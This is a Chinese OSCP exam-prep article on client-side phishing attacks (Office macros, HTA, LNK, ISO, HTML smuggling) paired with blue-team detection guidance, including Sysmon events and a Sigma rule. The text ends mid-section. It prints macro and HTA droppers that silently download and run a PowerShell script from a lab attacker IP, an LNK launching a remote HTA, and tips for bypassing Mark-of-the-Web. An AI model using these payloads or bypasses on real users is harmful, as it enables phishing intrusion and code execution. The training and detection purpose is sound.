---
title: OSCP百日备考30｜客户端攻击：钓鱼文档、Office宏、HTA——以及蓝队怎么一眼识破
url: https://mp.weixin.qq.com/s/5gK832ySjZWswbKCGYC7Pw
source: Doonsec's feed
date: 2026-11-22
fetch_date: 2026-11-23T10:01:00.708570
---

# OSCP百日备考30｜客户端攻击：钓鱼文档、Office宏、HTA——以及蓝队怎么一眼识破

# OSCP百日备考30｜客户端攻击：钓鱼文档、Office宏、HTA——以及蓝队怎么一眼识破

原创

陌离
陌离

泷羽Sec-陌离

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

[OSCP/OSEP一对一私教直通车：协议保障，直通高级渗透测试专家](https://mp.weixin.qq.com/s?__biz=Mzk1NzI5MTc0Nw==&mid=2247485677&idx=1&sn=21ae50662ffbecb83cc9c5058c90f474&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/GOiczibvxk0XQqibJPZYUgZgOZicAvMicD4x8AA1332ialmCAtjib7yw5Vib0AibcHymNVS7kaRkoQ8A7vQ5IvzkvW37IAA/640?wx_fmt=jpeg&from=appmsg)](https://mp.weixin.qq.com/s?__biz=Mzk1NzI5MTc0Nw==&mid=2247485677&idx=1&sn=21ae50662ffbecb83cc9c5058c90f474&scene=21#wechat_redirect)

## 你做的不是"病毒"，是一个让人愿意点开的文件

![](https://mmbiz.qpic.cn/mmbiz_jpg/Nw0LxfseydVX8XiaE0XXK6ibKvuCjcQicQNvvWQibt2ElVdTXYAfW0A7tskibSNQUs79BIuQqDEdibhvAKXosicdvpFzqq6XXWoc9BQQoIzuyLEO6c/640?wx_fmt=webp&from=appmsg)

大家好，这里是泷羽Sec-陌离

前面二十多期，我们打的都是"机器对机器"的仗：扫端口、打服务、提权、横移。这一期换个方向，讲**人**。

客户端攻击这个词听起来很技术，其实本质很朴素：**你没法直接连上目标的机器，那就想办法让目标自己把门打开。**

一封信、一个附件、一个"发票.docm"，用户双击的那一下，就是你的立足点。

这期开始，写法变了。以前只讲怎么打，现在每个技术讲三层：

| 层 | 讲什么 | 谁看 |
| --- | --- | --- |
| **攻击层** | 原理、构造、投递 | 考生、红队 |
| **检测层** | 在日志、邮件网关、EDR 里长什么样 | 蓝队、运维、SOC |
| **加固层** | 改哪个配置能拦住 | 甲方、运维、写报告的人 |

不是每期都硬加检测层。客户端攻击这块痕迹特别明显，三层都值得讲。

---

## 一、先泼盆冷水：客户端攻击在 OSCP 里不是主战场

PEN-200 有 Client-Side Attacks 这个模块，讲 Office 宏、HTA、JScript、钓鱼投递。所以它**在考纲里**。

但你要清楚它在考试里的实际分量。

OSCP+ 现在是 3 台独立靶机 + 1 套 AD 集。绝大多数独立靶机的入口是**服务漏洞、Web 应用、弱口令、公开 EXP**，不是"给你一个 docm 让你钓鱼"。AD 集更直接——开局就给你账号密码。

**所以：**

* 这块**要学**，因为它在考纲里，独立靶机偶尔会碰到"共享目录里有个文档""邮件附件"这类入口
* 但**别把它当主线**。花两周研究宏免杀，不如把 Kerberoasting 和提权练熟
* 它真正的价值在**真实项目**和**理解攻击链**——你以后做红队评估、做钓鱼演练，绕不开

一句话：**考纲内、非重点、实战刚需。**

---

## 二、攻击层：三条投递链

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Nw0LxfseydUXer5dtj3Ah2gdusrvefXGWoibTdSVgggphibqWQGgEO2icK5eicxgkct9mdUA3h7Wuc8sKMTgOKasiavHgnvQRHOz8HicVzTpxBRiaM/640?wx_fmt=webp&from=appmsg)

### 2.1 先搞懂一个前提：用户双击之后发生了什么

不管什么载体，链路都是一样的：

```
用户双击文件
   ↓
某个"合法程序"被调用（Word / mshta / explorer）
   ↓
它执行了我们写进去的代码
   ↓
代码去下载/执行第二阶段
   ↓
反弹 Shell
```

关键在第三步：**必须是系统里本来就有的、签过名的程序**。这就是"Living off the Land"的思路——不落地新 exe，用系统自带的。

Windows 上最常用的三个"合法宿主"：

| 宿主 | 正常用途 | 被滥用的点 |
| --- | --- | --- |
| `winword.exe` / `excel.exe` | 打开文档 | VBA 宏执行任意代码 |
| `mshta.exe` | 运行 HTML 应用 | 执行 VBScript / JScript |
| `wscript.exe` / `cscript.exe` | 运行 VBS / JS 脚本 | 直接跑脚本 |

---

### 2.2 Office 宏：最经典，但 2022 年之后变天了

#### 原理

Office 文档支持 VBA 宏。宏可以绑定在"打开文档"这个动作上：

```
' Word：文档打开时自动执行
Private Sub Document_Open()
    ...
End Sub

' Excel：工作簿打开时自动执行
Private Sub Workbook_Open()
    ...
End Sub
```

宏里能调用 `Shell()` 或 `WScript.Shell`，直接执行系统命令。

```
Sub Document_Open()
    Dim shell As Object
    Set shell = CreateObject("WScript.Shell")
    shell.Run "powershell -nop -w hidden -c ""IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/a.ps1')"""
End Sub
```

这段代码的意思：不弹窗、隐藏窗口、下载远程脚本并执行。`-nop` 是跳过配置文件，`-w hidden` 是隐藏窗口。

#### ⚠️ 2022 年之后的最大变化：MOTW 阻断

**这是这期最重要的一段。** 你网上看到的绝大多数"宏钓鱼"教程，都停留在 2021 年之前——那时候用户打开文档，顶上一条黄条，点"启用内容"就跑了。

现在不行了。

微软从 2022 年起改了 Office 的默认行为：**凡是带 Mark-of-the-Web（MOTW）的文件，VBA 宏默认被阻止执行。**

MOTW 是什么？是 Windows 给"来自互联网的文件"打的一个标记，存在 NTFS 的备用数据流里（`Zone.Identifier`）。浏览器下载的、邮件附件保存下来的，都会带上。

**现在的用户看到的是什么？**

不是黄条 + "启用内容"按钮，而是**红条**：

> ❝
>
> 安全风险：Microsoft 已阻止宏运行，因为此文件的来源不受信任。

**没有一键启用的按钮。** 用户必须离开 Office，去文件属性里勾"解除锁定"（Unblock），或者用 PowerShell `Unblock-File`，宏才能跑。

这个改动的杀伤力在于：\*\*它把决策点从"文档里点一下"挪到了"操作系统层面主动解锁"\*\*。大部分人不会为了看一张发票去改文件属性。

**几个必须知道的细节：**

| 细节 | 说明 |
| --- | --- |
| 只影响 Windows | Mac、移动端、Office 网页版不受影响 |
| 只对 NTFS 生效 | 文件放 FAT32 U 盘上，MOTW 不生效（这是一个真实的绕过点） |
| Trust Center 改设置没用 | "启用所有宏"不能绕过 MOTW 阻断，策略在它之上 |
| 企业可以强制 | `Block macros from running in Office files from the Internet` 策略一开，用户连解除锁定都不行 |

#### 那实战里还怎么打？

几条路，从"最正经"到"最野"：

**① 让目标自己解除锁定**

社工话术："这个文件是从邮件里下的，需要右键属性解除锁定才能看。"——听起来很合理，很多人会照做。

**② 用不受 MOTW 影响的格式**

比如 `.iso` / `.img`。用户双击挂载成虚拟光驱，里面的文件**不带 MOTW**（因为是从挂载的卷读的），宏就能正常跑。

⚠️ 这条属于**绕过安全机制**，在真实项目里算"规避检测"，报告里必须写清楚。考试环境不需要。

**③ 换载体**

宏被堵死了，就换 HTA、LNK、ISO。这也是为什么 2023 年之后 HTA 和 LNK 的钓鱼量明显上升——**攻击者不是变聪明了，是宏这条路被堵了。**

**④ 签名**

如果宏有可信发布者的数字签名，且目标机器信任这个证书，就能跑。实战里意味着你得先搞到一个受信任的签名证书——门槛很高。

#### 一个诚实的结论

**在默认配置的现代 Office 上，纯宏钓鱼的成功率已经很低了。** 这也是 PEN-200 还讲宏、但 OSCP 考试不把它当重点的原因。

你要会写宏、会改宏，因为靶场里的老环境可能没打这个补丁。但别指望它在真实环境里一击必中。

---

### 2.3 HTA：宏被堵之后的替代品

#### 原理

HTA 是 "HTML Application"，微软早年给的一种"用 HTML 写桌面程序"的格式。它由 `mshta.exe` 执行。

关键在于：**HTA 不是网页，是本地应用。** 它不受浏览器沙箱限制，里面的 VBScript / JScript 可以直接调系统对象。

```
<html>
<head>
<HTA:APPLICATION ID="oApp" WINDOWSTATE="minimize" SHOWINTASKBAR="no"/>
<script language="VBScript">
    Set shell = CreateObject("WScript.Shell")
    shell.Run "powershell -nop -w hidden -c ""IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/a.ps1')""", 0, False
    window.close
</script>
</head>
<body></body>
</html>
```

`WINDOWSTATE="minimize"` 让窗口最小化，`window.close` 执行完自己关掉——用户几乎看不到东西。

#### 为什么它比宏好用

| 对比 | Office 宏 | HTA |
| --- | --- | --- |
| 需要什么 | 装了 Office | 系统自带 mshta.exe |
| MOTW 阻断 | 有（2022 起） | 没有同等机制 |
| 用户操作 | 双击 + 可能要点确认 | 双击 |
| 落地形式 | 文档 | 单个 .hta 文件 |

**所以 HTA 是"宏被堵了之后"最常见的替代。** 它不需要 Office，不需要宏设置，双击就跑。

#### 缺点

`mshta.exe` 这个进程本身很显眼。EDR 里"mshta 启动 + 外连"几乎等于明牌。而且很多企业直接用 AppLocker 把 mshta 禁了。

---

### 2.4 LNK / ISO / HTML Smuggling：一条比一条绕

这三个不是"新东西"，是**在宏和 HTA 都被盯上之后的变体**。

#### LNK

Windows 快捷方式。可以设置"目标"为一个命令：

```
目标：C:\Windows\System32\mshta.exe http://10.10.14.5/a.hta
```

用户看到的是一个"发票.pdf.lnk"，图标是 PDF，双击就执行。\*\*关键是打开"显示文件扩展名"\*\*——不显示的话，`.lnk` 是隐藏的，用户只看到"发票.pdf"。

#### ISO / IMG

把一个 LNK 或 exe 打包成 ISO。用户双击挂载，得到一个虚拟光驱，里面的文件**不带 MOTW**。这是 2021 年之后 APT 常用的手法（比如 APT29 的 EnvyScout）。

#### HTML Smuggling

把 payload 用 Base64 塞进一个 HTML 文件里，用户用浏览器打开，JavaScript 在本地把 Base64 还原成二进制并触发下载。

**好处**：邮件网关看到的是一个 HTML 文件，里面没有可执行代码的签名；payload 是在**用户浏览器里**组装出来的，绕过了很多静态检测。

**坏处**：最终还是要在本地落地一个文件，用户还得双击。

---

### 2.5 一句话总结三条链

```
有 Office 且没打补丁  →  宏
没 Office / 宏被堵    →  HTA
连 HTA 都被盯上       →  LNK / ISO / HTML Smuggling
```

**攻击者的选择从来不是"哪个最强"，是"哪个还没被封"。**

---

## 三、检测层：蓝队看到的是什么

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Nw0LxfseydU3546JYpfRuTrR1pn2v33sATKB5criaBQEtS72FMvmWWSKHJudxQs5lW08ibF04HibJUZ6SuPVANeGruTPAXibebf0ntvaOJLMLpY/640?wx_fmt=webp&from=appmsg)

这一节是给防守方看的。但考生也该看——**你写报告时的"修复建议"，就来自这里。**

### 3.1 最值钱的一条告警：Office 派生子进程

正常办公软件不会去启动 `cmd.exe`、`powershell.exe`、`mshta.exe`。**这个父子关系本身就是异常。**

| 日志源 | 事件 ID | 看什么 |
| --- | --- | --- |
| **Sysmon** | **1** （进程创建） | `ParentImage` 是 winword/excel/outlook，`Image` 是 cmd/powershell/mshta/wscript |
| **Windows 安全日志** | **4688** | 同样的父子关系，但需要开命令行审计 |

4688 默认**不记录命令行**，必须开两个东西：

```
计算机配置 → Windows 设置 → 安全设置 → 高级审核策略
  → 详细跟踪 → 审核进程创建 = 成功

管理模板 → 系统 → 审核进程创建
  → 在进程创建事件中包含命令行 = 已启用
```

对应注册表：

```
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit
  ProcessCreationIncludeCmdLine_Enabled = 1
```

**没开这个，4688 里只有进程名，没有参数，基本没用。**

一条 Sigma 风格的规则长这样：

```
title: Office 应用派生子进程
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    ParentImage|endswith:
      - '\winword.exe'
      - '\excel.exe'
      - '\powerpnt.exe'
      - '\outlook.exe'
    Image|endswith:
      - '\cmd.exe'
      - '\powershell.exe'
      - '\mshta.exe'
      - '\wscript.exe'
      - '\cscript.exe'
  condition: selection
level: high
```

### 3.2 mshta 的三条高价值信号

| 信号 | 日志 | 为什么可疑 |
| --- | --- | --- |
| mshta 加载**远程 URL** | Sysmon 1（命令行里有 http/https） | 正常 HTA 是本地的 |
| mshta **外连** | Sysmon 3（网络连接） | 正常 HTA 不需要联网 |
| mshta 派生子进程 | Sysmon 1 | 正常 HTA 不该起 cmd/powershell |

三条里中任意两条，基本可以判定是恶意。

### 3.3 文件落地与挂载

| 行为 | 日志 | 说明 |
| --- | --- | --- |
| HTA 被缓存 | 文件系统 / `%LOCALAPPDATA%\Microsoft\Windows\INetCache` | 远程 HTA 会留缓存 |
| 可疑文件写入 | **Sysmon 11** （文件创建） | 重点看 `%TEMP%`、`%APPDATA%`、`C:\Users\Public` |
| ISO 被挂载 | 注册表 `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\MountPoints2` | 挂载会写这个键 |
| 从光驱盘符执行 | Sysmon 1 | `Image` 路径是 `D:\`、`E:\` 这类 |

### 3.4 宏本身的内容

宏代码在内存里执行，静态文件扫描不一定看得到。两个补充手段：

* **AMSI**：Office 会把宏内容交给 AMSI 扫描（Office 365 / 2019+），日志在 Application 日志的 `Microsoft-Windows-AMSI` 源
* **Defender for Endpoint**：能拿到宏的行为链，不只是文件哈希

### 3.5 ASR 拦截日志

如果企业开了攻击面缩减（ASR...